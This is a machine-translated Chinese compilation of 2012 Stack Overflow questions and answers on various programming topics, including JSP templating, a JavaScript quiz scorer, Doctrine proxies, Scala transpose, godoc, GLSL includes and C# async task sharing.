> 赞同：1
> 
> 时间：2012-11-23T13:27:51.883
> 
> 标签：java, jsp, template-engine

可以说我正在尝试在 java 上制作一些 CMS 或简单的模板引擎。
我目前拥有的：

*   三个类`Block`，`Module`并且`Extension`有一些区别。他们每个人都使用hibernate扩展`public abstract class AbstractElement`和映射到数据库；这种结构允许以后使用所有这些混乱，例如，用户友好的元素管理（在网站或其他地方）、验证版本和更新它们等。*   `public class ElementController`，它的工作原理与 DAO 类似——它从数据库中检索有关已注册元素的数据并将其放入 HashMaps 中，从而允许从模板类访问它们。*   /Database/Templates/{template_name} 等文件夹，最初将存储模板。每个模板都必须有`index.jsp`，等等——基本的“模板”。

    **我想做的事：**
    简单基本的模板引擎（reed: light）。目前，正如我所看到的，计划有几个 JSP 标记用于模板化，例如`<template:includePanel panel="Left">`or `<template:pageTitle>`。我只需要这些基础知识，正如我所见，使用 JSP 标记使模板比插入代码更具可读性（使用现有的模板引擎是可能的，但我仍然找不到合适的）；
    **有问题的部分：**管理块或模块。虽然模块是一个大问题，并且可能会派生到“插件”系统，但块是基本元素，除了 JSP 中的业务逻辑之外没有业务逻辑。然后为每个人注册单独的“描述”类是一个糟糕的设计。
    目前，如上所述，所有块描述都存储在数据库中，用于处理块的设置，如面板，它所属的面板和面板中的顺序。因此，唯一的问题情况是自动注册块（即 jsp 页面）。
    **我可以看到的变体：**
    *   创建一些自定义标签，例如

    ```
    <template:block name="BlockName">
    ...
    </template:block> 
    ```

    计划中，此标签将此块添加到模板，如果它已经注册或将其添加到数据库，它将从数据库中刷新它的设置。但这行不通，只要 JSP 页面在运行时编译，即使这样，也不会处理这个标签。在这种情况下，我需要在请求模板之前调用每个块的 JSP，这将从哈希（刷新）中获取块信息。**优点：**我可以在单个页面中定义几个独立的块，并将它们处理成带有标签正文的模板；不需要其他代码来注册/获取信息/包含块；

    *   强制创建块以使其扩展一些`public class AutoRegister`JSP 指令`page`。块注册的所有代码都会放在构造函数中，但是在这种情况下我仍然需要单独调用每个块的页面（这种情况下尝试使用反射，但只要页面没有编译，就找不到）。除了每页一个块（jsp/jspf）之外，与之前的变体类似；*   强制用户为每个块或块组创建一些“注册者”类，然后仅从数据库中检索信息。**优点：**保证所有块都已注册，块页面中除了块的逻辑之外没有代码，注册器类可以派生于一些抽象的预定义类并在容器启动时自动调用；**缺点：**没有机会在不重新启动 web 应用程序的情况下添加或删除块（也许可以部署，但删除不会那么容易），即使这是单独的块，也需要创建这样的注册器，而不是某些系统的一部分/插入;*   保留所有块的需要分离的类，从类 Block 派生并通过`Reflection`库解析它们（现在完成）。**缺点：**很多“垃圾”类，只要它们的唯一功能是注册所有块。

    在寻找答案时，我对 和 之类的模板引擎进行了简短的了解`Velocity`，`FreeMarker`但只要我能看到，它们就无法为我提供这样的“自动注册”。

    **最后，问题是：**
    什么方法（来自上面描述的或一些不同的）或模板引擎可以为这种机制提供“短而美”的用法（比如简单的 JSP 标记或其他东西）？或者在尝试和测试上述变体时我错过了什么？

# javascript - 在尝试进行 javascript 测验时完全迷失了？

> ID：13530111
> 
> 赞同：0
> 
> 时间：2012-11-23T13:27:52.127
> 
> 标签：javascript

我正在尝试使用单选按钮在 Javascript 中进行测验。我希望能够显示分数，并向用户显示他们回答错误的问题。

到目前为止，这是我的脚本：

```
var numQues = 4;
var numChoices = 4;

var answers = new Array(numQues)
answers[0] = "b";
answers[1] = "c";
answers[2] = "b";
answers[3] = "a";

function getScore(form) {
    var score = 0;
    var currQ;
    var currChoice;

    if(currChoice.checked) {
        if(currChoice.value == answers[i]) {
            score++;
            break;
        }
    }
}

form.scoreOutofFour.value = score + "/4"; 
```

这是我的 HTML：

```
<body>
  <div id="content">
    <form name="quiz">
      <table>
        <tr>
          <td> 
            <b>1.</b> Example Question 1  <br />
            <input type="radio" name="q1" value="a" /> a) Example answer 1 <br />
            <input type="radio" name="q1" value="b" /> b) Example answer 2 <br />
            <input type="radio" name="q1" value="c" /> c) Example answer 3<br />
            <input type="radio" name="q1" value="d" /> d) Example answer 4<br />
          </td>
        </tr>
        <tr>
          <td> 
            <b>2.</b>Example Question 2 <br />
            <input type="radio" name="q2" value="a" /> a) Example answer 1 <br />
            <input type="radio" name="q2" value="b" /> b) Example answer 2 <br />
            <input type="radio" name="q2" value="c" /> c) Example answer 3 <br />
            <input type="radio" name="q2" value="d" /> d) Example answer 4 <br />
          </td>
        </tr>
        <tr>
          <td> 
            <b>3.</b> Example Question 3  <br />
            <input type="radio" name="q3" value="a" /> a) Example answer 1 <br />
            <input type="radio" name="q3" value="b" /> b) Example answer 2<br />
            <input type="radio" name="q3" value="c" /> c) Example answer 3  <br />
            <input type="radio" name="q3" value="d" /> d) Example answer 4 <br />
          </td>
        </tr>
        <tr>
          <td> 
            <b>4.</b>Example Question 4<br />
            <input type="radio" name="q4" value="a" /> a) Example answer 1  <br />
            <input type="radio" name="q4" value="b" /> b) Example answer 2<br />
            <input type="radio" name="q4" value="c" /> c) Example answer 3 <br />
            <input type="radio" name="q4" value="d" /> d) Example answer 4   <br />
          </td>
        </tr>
        <tr>
          <td colspan="2">
            <b><input type="button" value="Get score" onClick="getScore(this.form); readtheCookie();" /> 
            <input type="reset" value="Clear" /></b> 
            <p>
              <b>
            <div id="cookie12"></div></b><br />
            <textarea name="scoreOutofFour" size="15"></textarea>
            <br />  
          </td>
        </tr>
      </table>
    </form>
  </div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:10:48.407

您并没有像您想象的那样远离解决方案。

看看这个可能的解决方案，希望它能帮助你走上正确的轨道。

```
var numQues = 4;
var numChoices = 4;

var answers = new Array(numQues);
answers[0] = "b";
answers[1] = "c";
answers[2] = "b";
answers[3] = "a";

function getScore(form) {
    var score = 0;
    var currQ;
    var currChoice;
    var i, j;

    // loop through the number of questions
    for (i = 0; i < numQues; i ++) {

        // build the name of the form element we want to look at by
        // appending the loop number to 'q', on the first loop the value
        // will be 'q1', on the second 'q2' and so on
        var eleName = 'q' + (i + 1);

        // get all the form elements with the name we built above
        // this should get 4 elements (one for each of the selectable answers)
        var answerRadios = form[eleName];

        // loop through the 4 answer radio buttons
        for (j = 0; j < answerRadios.length; j++) {

            // create a variable to store the current radio button, so
            // it is easier to refernce
            var radio = answerRadios[j];

            // now we check that is this radio button is checked (selected)
            // and the value of this radio is the answer (as defined at the top)
            // then we add 1 tot he score
            if (radio.checked === true && radio.value === answers[i]) {
                score += 1;
            }
        }
    }

    // write the score to the html
    form.scoreOutofFour.value = score + "/4";
} 
```

# php - 尝试访问可为空的关联时出错

> ID：13530113
> 
> 赞同：0
> 
> 时间：2012-11-23T13:27:54.717
> 
> 标签：php, symfony, doctrine-orm, lazy-loading

我有两个实体，`Aufgabe`并且`Version`有一个 oneToMany-Relation （一个`Version`可以有很多`Aufgaben`），但它是**可选**的，意味着`Aufgabe`不需要`Version`分配。这是它们的 YAML 映射：

版本：

```
evenos\Bundle\TimeBundle\Entity\Version:
    type: entity
    repositoryClass: evenos\Bundle\TimeBundle\Repository\VersionRepository
    table: version

    id: 
        id:
            type: integer 
        Projekt:
            associationKey: true

    fields:
        nummer:
            type: string
            length: 20
            nullable: false
        beschreibung:
            type: text
            nullable: true
        faktor: 
            type: decimal
            precision: 2
            scale: 1

    uniqueConstraints:
        version_nr_unique:
           columns: nummer

    oneToMany:
        Aufgaben:
            targetEntity: Aufgabe
            mappedBy: Version

    [...] 
```

奥夫加贝：

```
evenos\Bundle\TimeBundle\Entity\Aufgabe:
    type: entity
    repositoryClass: evenos\Bundle\TimeBundle\Repository\AufgabeRepository
    table: aufgabe

    id: 
        id:
            type: integer
            generator:
                strategy: AUTO

    fields:
        name:
            type: string
            length: 40
        beschreibung:
            type: text
            nullable: true
        faktor: 
            type: decimal
            precision: 2
            scale: 1
        soll_aufwand:
            type: integer

    oneToMany:

        [...]

    manyToOne:

        [...]

        Version:
            targetEntity: Version
            inversedBy: Aufgaben
            joinColumns:
                - name: projekt_nummer
                  nullable: true
                  referencedColumnName: projekt_nummer
                - name: version_id
                  nullable: true
                  referencedColumnName: id 
```

在我的`AufgabeRepository`我有一个自定义方法`findAufgabenByProjektAndVersion($projekt = null, $version = null)`- 如果`$version`是一个版本对象，它使用它的 ID`$version->getId()`进行查询，否则它搜索`"[...] where version is null"`.

**问题：**因为从`Aufgabe`到的关联`Version`是可选的（`nullable: true`），有时`$whatever->getAufgabe()->getVersion()`是`null`。或者说应该是。相反，当我将它传递给我的存储库函数并且`Aufgabe`没有`Version`设置时，我收到一个错误：

```
Notice: Undefined index: id in /home/manuel/project/zeiterfassung/dev/app/cache/dev/doctrine/orm/Proxies/__CG__evenosBundleTimeBundleEntityVersion.php line 54 
```

我查看了代理类，提到的行是：

```
public function getId()
{
    if ($this->__isInitialized__ === false) {
        return (int) $this->_identifier["id"];
    }
    $this->__load();
    return parent::getId();
} 
```

显然代理对象没有初始化......但如果没有分配，不应该`..->getAufgabe()->getVersion()`返回？`NULL``Aufgabe``Version`

因为它不是 null 而是一个未初始化的代理，所以我的自定义 finder 函数认为它是一个有效的版本......

...

在某处，我担心我做错了什么，但我现在没有看到它:) 也许我读错了一些东西并且`nullable: true`不允许进行关联？

**更新：**我的`findAufgabenByProjektAndVersion`方法`AufgabeRepository`：

```
public function findAufgabenByProjektAndVersion(Projekt $projekt = NULL, Version $version = NULL)
{
    $qb = $this->getEntityManager()->createQueryBuilder()->addSelect('A')
            ->from('evenosTimeBundle:Aufgabe', 'A')
            ->leftJoin('A.Version', 'V'); 

    if (is_null($projekt))
    {
        $qb->where('A.Projekt is null');
    }
    else
    {
        $qb->where('A.Projekt is null OR A.Projekt = :projekt')->setParameter('projekt', $projekt);
    }

    if (is_null($version))
    {
        $qb->andWhere('V.nummer is null');
    }
    else
    {
        $qb->andWhere('V.nummer is null OR (V.Projekt = :vprojekt AND V.id = :vid)')
        ->setParameter('vprojekt', $projekt)
        ->setParameter('vid', $version->getId());
    }

    return $qb->getQuery()->getResult();
} 
```

`Version`我需要在第二个中查询显式键，`else`因为 Doctrine 告诉我我无法搜索`p.Version = :version`它是否具有复合键（引发错误）。

# scala - 在序列中迭代对时出错

> ID：13530115
> 
> 赞同：0
> 
> 时间：2012-11-23T13:28:01.910
> 
> 标签：scala, transpose

阅读[此问题](https://stackoverflow.com/questions/8320840/how-to-iterate-collection-pairs)后，我希望以下内容可以正常工作：

```
Seq( Seq(1,2,3) , Seq(4,5,6) ).transpose() 
```

可惜：

```
error: not enough arguments for method transpose: (implicit asTraversable: 
Seq[Int] => scala.collection.GenTraversableOnce[B])Seq[Seq[B]].
Unspecified value parameter asTraversable.
          Seq( Seq(1,2,3) , Seq(4,5,6) ).transpose() 
```

[另外，我似乎在 scala docs 上](http://docs.scala-lang.org/search.html?q=transpose)找不到任何转置的参考，尽管[Seq 引用了它](http://www.scala-lang.org/api/current/scala/collection/Seq.html)

提供身份，它似乎以某种方式工作：

```
scala> Seq( Seq(1,2,3) , Seq(4,5,6) ).transpose( a => a)
res10: Seq[Seq[Int]] = List(List(1, 4), List(2, 5), List(3, 6)) 
```

但仍然返回 List 而不是 Seq

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T13:32:05.783

不用括号直接使用：

```
Seq( Seq(1,2,3) , Seq(4,5,6) ).transpose
//res0: Seq[Seq[Int]] = List(List(1, 4), List(2, 5), List(3, 6)) 
```

*但仍然返回 List 而不是 Seq*

好吧，实际上[List 是 Seq 的继承者](http://www.scala-lang.org/docu/files/collections-api/collections.immutable.png)，所以毕竟你得到了一个 Seq （查看结果的左侧部分）。

这种行为的原因是 transpose 实际上定义为**带**参数的函数，但由于它的参数定义为[隐式](http://www.scala-lang.org/node/114)，您可以选择将替换参数的工作委托给 scala 编译器（它将为您执行编译时查找）。

如果您编写括号，则任何一个函数都必须具有不带参数的重载形式，例如

```
def transpose() = ... 
```

或者你必须在其中写一些东西（这实际上是语法问题）。

# go - 如何使用 `godoc` 生成 HTML 文档？

> ID：13530120
> 
> 赞同：65
> 
> 时间：2012-11-23T13:28:19.753
> 
> 标签：go

我写了一个小go程序，我想从源代码生成独立的HTML文档，可以在没有godoc服务器的情况下查看。但我找不到任何方法来实现它。如果有人可以帮助我，我将不胜感激。

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-11-23T13:42:43.690

更好的形式可以通过以下方式产生：

```
godoc -url "http://localhost:6060/pkg/container/heap/" > page.html 
```

（我的 godoc 服务器在 :6060 运行，我不确定这是否是先决条件）。

如果通过调整生成的 HTML 文件以正确引用它，结合在 Go 存储库中找到的原始 CSS 样式，HTML 可能看起来会更好。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-11-23T17:46:56.380

这可能不会直接回答您的问题，但如果您打算开源您的项目，您实际上不必手动生成 HTML。只需确保您在源代码中正确插入了注释，并使用 godoc.org( [http://godoc.org/-/about](http://godoc.org/-/about) ) 来处理它。

它在 Bitbucket、Github、Launchpad 和 Google Project Hosting 上显示 Go 包的文档。

例如： http: [//godoc.org/code.google.com/p/go.crypto/ssh](http://godoc.org/code.google.com/p/go.crypto/ssh)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2019-04-30T18:18:15.420

运行服务器并使用 wget 获取它

```
godoc -http=:6060 
```

等待它启动然后（“容器/堆/”与您的应用程序）：

```
wget -p -k http://localhost:6060/pkg/container/heap/ 
```

要下载所有文档，我使用以下内容：

```
wget -m -k -q -erobots=off --no-host-directories --no-use-server-timestamps http://localhost:6060 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-09-15T16:03:17.117

（从[https://stackoverflow.com/a/63905155/3715832](https://stackoverflow.com/a/63905155/3715832)移动）

如果你想尝试不同的文档风格，你可以试试[Golds](https://github.com/go101/golds)，这是一个替代的 Go 文档生成工具（和本地文档服务器/代码阅读器）。

在您的项目目录下，您可以运行以下任何命令来为您的 Go 项目生成 HTML 文档：

*   golds -gen -nouses -plainsrc -wdpkgs-listing=promoted ./...
*   golds -gen -nouses -wdpkgs-listing=promoted ./...
*   golds -gen -wdpkgs-listing=提升 ./...

第一个命令生成最紧凑的文档，最后一个命令生成完整的文档，其大小是紧凑文档的 6 倍。

顺便说一句，我是**Golds**的作者。希望你这个工具能满足你的需要。

# jquery - 使用 Javascript 和 jQuery 进行清理：自动转义引号和双引号？

> ID：13530122
> 
> 赞同：1
> 
> 时间：2012-11-23T13:28:24.470
> 
> 标签：jquery, html, css, sanitization

是否有一些现成的命令可以在不创建引号混乱的情况下转义引号？假设我获取 [1] 类型的代码块并且我根本不想编辑它——一些命令来处理清理，所以不拦截其余代码？

```
<div id='p'>
        <div id='pp'></div>
        <div id='ppp'></div>
</div>

<script>
        $('div.pp').html('INSERT 1: both quotes, fails, without escaping')
</script>

 [1]  <a href="..."><img src='. fails,needs escaping..'></a> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:38:05.170

通过使用此约定来避免引用混乱：

*   在 HTML 代码中对属性值使用双引号
*   在 JavaScript 代码中对字符串文字使用单引号

HTML：

```
<div id="p">
    <div id="pp"></div>
</div> 
```

JavaScript：

```
$( '#pp' ).html( '<a href="..."><img src="..."></a>' ); 
```

**现场演示：http:** [//jsfiddle.net/HqrSz/](http://jsfiddle.net/HqrSz/)

# git - 为什么 Git 忽略了我的 Makefile？

> ID：13530124
> 
> 赞同：6
> 
> 时间：2012-11-23T13:28:35.083
> 
> 标签：git, gitignore

我正在尝试将 Makefile 包含在我的 git 存储库中，但我收到以下消息：

```
$ git add Makefile
The following paths are ignored by one of your .gitignore files:
Makefile
Use -f if you really want to add them.
fatal: no files added 
```

在我的回购`.gitignore`文件中，我有：

```
*.pdf 
```

在我的 ~/.gitignore_global

```
#-*-shell-script-*-

# Python
*.pyc

# Latex
*.aux
*.bbl
*.blg
*.log

build

# Mac
*~
.DS_Store 
```

我的 .gitignore_global 在 git config 中：

```
$ git config -l
core.excludesfile=/Users/marcos/.gitignore_global 
```

我的回购不在另一个回购中。为什么 Git 忽略了我的 Makefile？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T13:41:28.143

引用[gitignore 手册](http://www.kernel.org/pub/software/scm/git/docs/gitignore.html)（强调我的）：

> gitignore 文件中的每一行都指定一个模式。在决定是否忽略路径时，git 通常会检查**来自多个源**的 gitignore 模式，其优先级顺序如下，从最高到最低（在一个优先级内，最后匹配的模式决定结果）：
> 
> (...)
> 
> *   从**$GIT_DIR/info/exclude**读取的模式。

所以你必须检查`.git/info/exclude`.

# php - Assetic twig 图像函数的简短语法

> ID：13530126
> 
> 赞同：2
> 
> 时间：2012-11-23T13:28:39.203
> 
> 标签：php, image, symfony, twig, assetic

我像这样在资产上添加图片：

```
{% image '@MyBundle/Resources/public/img/name.png' %} 
  <img src="{{ asset_url }}"/>
{% endimage %} 
```

对我来说很好，但我想少写一些，所以我尝试创建一个像 symfony2 文档中那样的 twig 函数。但我不使用任何过滤器：

```
assetic:
    debug:          "%kernel.debug%"
    use_controller: false
    bundles:        [MyBundle]
    #java: /usr/bin/java
    filters:
        cssrewrite: ~
    twig:
        functions:
            timg: ~ 
```

但如果我现在使用它：

```
<img src="{{ timg('@MyBundle/Resources/public/img/name.png') }}" /> 
```

我得到了例外：

> 编译模板期间抛出异常（“可捕获的致命错误：传递给 Twig_Node_Expression_GetAttr::__construct() 的参数 3 必须是 Twig_Node_Expression_Array 的实例，给定的 Twig_Node 实例，在 C:\wamp2\www\symfony\ vendor\symfony\assetic-bundle\Symfony\Bundle\AsseticBundle\Twig\AsseticNodeVisitor.php 在第 66 行并在 C:\wamp2\www\symfony\vendor\twig\twig\lib\Twig\Node\Expression\GetAttr 中定义。 php 第 14 行") 在 "::top.html.twig" 中。

有任何想法吗？也许我不能在没有过滤器的情况下仅将函数用于短语法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-29T15:55:55.437

我建议您定义一个非常简单的过滤器并像这样使用它`{{ 'mypath'|timg }}`：

```
class ImgExtension extends \Twig_Extension
{
    private $asset;
    public function __construct(Container $c){
        $this->asset = $c->get('templating.helper.assets');
    }
    public function getFilters(){
        return array('timg' => new \Twig_Filter_Method($this, 'timg'));
    }
    public function timg($src, $package = null) {
        $url = $this->asset->getUrl($src, $package);
        return '<img src="'.$url.'" />';
    }
    public function getName(){
        return 'timg';
    }
} 
```

然后您可以添加一些其他有用的参数，例如`alt`,`title`等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-17T21:32:16.720

您的函数名称需要映射到过滤器名称。

例如：

```
assetic:
    debug:          "%kernel.debug%"
    use_controller: false
    bundles:        [MyBundle]
    filters:
        cssrewrite: ~
    twig:
        functions:
            cssrewrite: ~ 
```

允许您执行以下操作：

```
<link rel="stylesheet" href="{{ cssrewrite('bundles/my/css/style.css') }}" /> 
```

**这只是说明了语法**：使用 cssrewrite 作为函数在 dev 上工作，但在 prod 上工作 - 在没有揭示确切原因的情况下，我重申assetic-filter-functions-in-twig 最适合基于[图像的过滤器](http://richardmiller.co.uk/2011/06/23/symfony2-assetic-twig-functions/)的建议。

为了以`timg`相同的方式用作函数，必须首先将其定义为资产过滤器。您必须首先将其实现为[自定义资产过滤器](http://richardmiller.co.uk/2011/05/24/symfony2-make-your-own-assetic-filter/)。

一目了然@alexcasalboni 的答案提供了一个很好的实现树枝过滤器的例子，并且似乎比在 symfony 中设置资产过滤器配置更少。

# windows-phone-7 - 我可以像在 Apple 中那样向 WindowsPhone Approve 团队询问类似“加速审核”的问题吗？

> ID：13530128
> 
> 赞同：0
> 
> 时间：2012-11-23T13:28:40.320
> 
> 标签：windows-phone-7

我有一个为某个活动编写的应用程序，我通过 Apple 提出了加急审查请求。

WindowsPhone 有这样的东西吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T16:45:08.030

是的，上传您的申请时，您只需在消息表单中写下您需要的所有内容。

![开发者中心 WP7](../Images/f440bcd34f663412403f7b6641140e38.png)

# java - 如何配置tomcat6从另一个目录启动

> ID：13530132
> 
> 赞同：0
> 
> 时间：2012-11-23T13:29:01.373
> 
> 标签：java, tomcat6

我有个问题。我不知道如何配置 tomcat6/webapps/ROOT/META-INF/context.xml 以从目录 /home/myname/project/test/web/target/firsttest-1.1.0.SNAPSHOT.war 启动我的应用程序我，请！我无法用谷歌搜索这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T04:09:44.017

您可以使用以下环境变量配置 Tomcat 在何处查找配置信息：

CATALINA_HOME 是 tomcat 二进制文件所在的位置。

CATALINA_BASE 是实例特定配置文件所在的位置。这应该看起来像原始 Tomcat 基本目录的副本，其中包含 conf、logs、temp、webapps 和 work 文件夹。

因此，通过设置 CATALINA_BASE 环境变量，您可以将 Tomcat 配置为在多种不同的配置中运行。

# artificial-intelligence - AI 中的 ATRANS 和 PTRANS 是什么？

> ID：13530140
> 
> 赞同：2
> 
> 时间：2012-11-23T13:29:41.700
> 
> 标签：artificial-intelligence

在学习自然语言处理时，我遇到了概念依赖的主题。我见过这样的例子：

```
 (PTRANS ACTOR(MARY) TO(SCHOOL))
   (ATRANS ACTOR(JOHN) OBJECT(BOOK) TO(MARY)) 
```

这些线到底是什么意思？`PTRANS`具体来说和等术语的定义是什么`ATRANS`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T13:52:30.740

ptrans-transfer 对象物理位置的
trans-transfer 抽象关系的trans-transfer。
这些词用于表示概念化。这些词表示概念化对应于基础概念之间的语义关系。CD 提供了非正式的结构，这意味着您可以用一个标准来表示它们，这些不绑定到任何特定的语言。

你可以用 prolog 或 LISP 语言实现 CD

# include - 如何编写可重用的 glsl 代码？

> ID：13530146
> 
> 赞同：8
> 
> 时间：2012-11-23T13:30:07.107
> 
> 标签：include, preprocessor, glsl, code-reuse

我的着色器经常共享许多相同的功能。例如漫反射/镜面光照的计算。我想写一次，然后在不同的着色器中重用代码。

Glsl 不了解文件，也不支持类似 c 的`#include`预处理器指令。

我知道 glsl 支持从多个 cstrings 编译源代码，但是你怎么知道要包含哪些 cstrings？您是否实现了自己的包含版本？或者您是否为每个着色器创建某种元文件？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T15:29:07.730

在大型项目中，着色器通常在第一次运行（或更改图形选项时）组装，因此它们将包括所有供应商特定的功能，并针对用户机器和设置进行了优化。不仅是着色器，还有渲染管道的某些阶段。
您可以将 GLSL 视为 PHP 脚本为响应请求而吐出的 HTML\CSS\JavaSript 代码。并且您可以在循环中使用与 tampleting、代码注入（例如纹理查找量）相同的技术。它对图形设计师也有好处，因为他们可以通过参数化对着色器源进行简单控制——支票簿、输入字段等，它可以为独特的情况生成独特的着色器。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T15:46:37.127

我有一个基于[http://blackpixel.com/blog/494/xcode-using-includes-in-opengl-shaders/](http://blackpixel.com/blog/494/xcode-using-includes-in-opengl-shaders/) [404 now] 的自定义解决方案。基本上它说您可以使用[m4](http://www.gnu.org/software/m4/)工具来预处理文件。

在 GLSL 源文件中只包含您想要重用的所需片段：

```
include(Utils.glsl)
include(Colors.glsl)

...

void main (void) {
    ...
} 
```

在 Xcode 中，将所有`glsl`文件添加到“Copy Bundle Resources”。

使用此 shell 脚本添加“运行脚本”阶段：

```
#!/bin/sh

cd ${BUILT_PRODUCTS_DIR}/${WRAPPER_NAME}
find . -name "*.fsh" | while read file; do
    echo Preprocess $file
    m4 "$file" > "$file.tmp"
    mv "$file.tmp" "$file"
done

exit 0 
```

该脚本假定您的着色器具有`.fsh`扩展名。修改它以匹配您的着色器扩展是微不足道的。

请注意：几乎任何人都可以轻松访问您的着色器。您可以将其用于开发并在释放它们之前将它们转换为字符串（除非您对其进行加密，否则不是真正的保护......）。

此外，如果着色器之间没有太多共享，您最终会得到很多未使用的代码。我猜着色器编译器会处理它，但我不能 100% 确定是否存在一些性能损失。

# iphone - 带有旋转功能的 icarousel 类。

> ID：13530154
> 
> 赞同：0
> 
> 时间：2012-11-23T13:30:30.307
> 
> 标签：iphone, objective-c, ios, ios4, icarousel

我正在开发一个 iphone 应用程序。

我正在使用 iCarousel 类： [https ://github.com/nicklockwood/iCarousel](https://github.com/nicklockwood/iCarousel)

我希望这样当有人点击其中一个轮播图像时，图像会翻转以显示图像背面的按钮，人们可以点击这些按钮。

我正在按照本教程来实现 icarousel 类：http: [//mobile.tutsplus.com/tutorials/iphone/create-an-awesome-carousel-version-2-0/](http://mobile.tutsplus.com/tutorials/iphone/create-an-awesome-carousel-version-2-0/)

如何添加方法来实现我上面描述的目标？

我做了以下事情：

```
- (void)carousel:(iCarousel *)carousel didSelectItemAtIndex:(NSInteger)index
{

    CGRect frame = CGRectMake(round((self.view.bounds.size.width - 300) / 2.0), 0, 300, 300);

    UIImageView *flipToView = [[UIImageView alloc] initWithFrame: frame];
    flipToView.image = [UIImage imageNamed:@"cl2.png"];

    UIView *containerView = self.aCarousel.currentItemView.superview;

    [UIView transitionFromView: containerView toView: flipToView duration:2.0 options:UIViewAnimationOptionTransitionFlipFromLeft
                    completion:nil];

} 
```

但是我如何为轮播中的每个图像提供不同的翻转图像？就像在轮播上单击的每个图像的翻转视图都是不同的。还有当人们向右滚动时如何隐藏翻转的图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T11:06:46.827

You can add an extra imageview at the center position of the iCarousel as a sibling view via XIB. Initially the alpha of the view is 0 and becomes 1 only when user select any index and then set the image of the imageview according to selected index and just flip it. And once you have done again set alpha 0. Try this and if you still face any problem let me know because I have already done this type of thing, not same as flipping but I have implemented the scaling on the iCarousel.

# html - GWT 最小化生成的 HTML 代码

> ID：13530156
> 
> 赞同：0
> 
> 时间：2012-11-23T13:30:33.857
> 
> 标签：html, gwt, minimize

我想减小例如由 GWT [VerticalPanel](http://google-web-toolkit.googlecode.com/svn/javadoc/2.5/com/google/gwt/user/client/ui/VerticalPanel.html)生成的 HTML 代码的大小。我怎样才能做到这一点？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:12:37.410

小部件不生成 HTML，它们操作 DOM 元素。没有什么可以*缩小*的。

如果您是`VerticalPanel`使用 a 的错误，`<table>`那么，请不要使用`VerticalPanel`. 在许多情况下，一个`FlowPanel`就足够了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:46:28.857

我有点不确定你的目标。

为了让 GWT 库适应 VerticalPanel 的所有可能用途，需要一定数量的 HTML 代码。我发现编译后的 GWT 代码非常紧凑。

我认为没有办法减少输出 HTML 的数量。

# c# - 一个任务可以有多个等待者吗？

> ID：13530158
> 
> 赞同：10
> 
> 时间：2012-11-23T13:30:40.827
> 
> 标签：c#, .net-4.0, windows-runtime, task-parallel-library, .net-4.5

我正在玩弄 Windows 8 项目的异步服务，并且该服务有一些异步调用，一次只能调用一次。

```
 public async Task CallThisOnlyOnce()
 {
      PropagateSomeEvents();

      await SomeOtherMethod();

      PropagateDifferentEvents();
 } 
```

由于您无法将异步调用封装在锁定语句中，因此我想到了使用该`AsyncLock`模式，但我认为我不妨尝试这样的事情：

```
 private Task _callThisOnlyOnce;
 public Task CallThisOnlyOnce()
 {
      if(_callThisOnlyOnce != null && _callThisOnlyOnce.IsCompleted)
         _callThisOnlyOnce = null;

      if(_callThisOnlyOnce == null)
         _callThisOnlyOnce = CallThisOnlyOnceAsync();

      return _callThisOnlyOnce;
 }

 private async Task CallThisOnlyOnceAsync()
 {
      PropagateSomeEvents();

      await SomeOtherMethod();

      PropagateDifferentEvents();
 } 
```

因此，您最终`CallThisOnlyOnceAsync`只会同时执行一次调用，并且多个等待者会挂接到同一个任务上。

这是一种“有效”的做法，还是这种方法有一些缺点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T16:50:25.897

一个任务可以有多个等待者。但是，正如 Damien 指出的那样，您提出的代码存在严重的竞争条件。

如果您希望每次调用方法时都执行代码（但不是同时），请使用`AsyncLock`. 如果您希望代码只执行一次，请使用`AsyncLazy`.

您提出的解决方案尝试组合多个调用，如果代码尚未运行，则再次执行该代码。这更加棘手，解决方案在很大程度上取决于您需要的确切语义。这是一个选项：

```
private AsyncLock mutex = new AsyncLock();
private Task executing;

public async Task CallThisOnlyOnceAsync()
{
  Task action = null;
  using (await mutex.LockAsync())
  {
    if (executing == null)
      executing = DoCallThisOnlyOnceAsync();
    action = executing;
  }

  await action;
}

private async Task DoCallThisOnlyOnceAsync()
{
  PropagateSomeEvents();

  await SomeOtherMethod();

  PropagateDifferentEvents();

  using (await mutex.LockAsync())
  {
    executing = null;
  }
} 
```

也可以使用 来执行此操作`Interlocked`，但是该代码会变得很难看。

PS 我的[AsyncEx 库](http://nitoasyncex.codeplex.com/documentation)`AsyncLock`中有,`AsyncLazy`和其他准备好的`async`原语。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-23T13:39:46.760

如果可能涉及多个线程，则此代码看起来非常“活泼”。

一个例子（我相信还有更多）。假设`_callThisOnlyOnce`当前是`null`：

```
Thread 1                                                          Thread 2

public Task CallThisOnlyOnce()
{
  if(_callThisOnlyOnce != null && _callThisOnlyOnce.IsCompleted)
     _callThisOnlyOnce = null;

  if(_callThisOnlyOnce == null)
                                                                   public Task CallThisOnlyOnce()
                                                                   {
                                                                     if(_callThisOnlyOnce != null && _callThisOnlyOnce.IsCompleted)
                                                                        _callThisOnlyOnce = null;

                                                                     if(_callThisOnlyOnce == null)
                                                                        _callThisOnlyOnce = CallThisOnlyOnceAsync();

                                                                     return _callThisOnlyOnce;
                                                                   }
     _callThisOnlyOnce = CallThisOnlyOnceAsync();

  return _callThisOnlyOnce;
} 
```

您现在有 2 个呼叫同时运行。

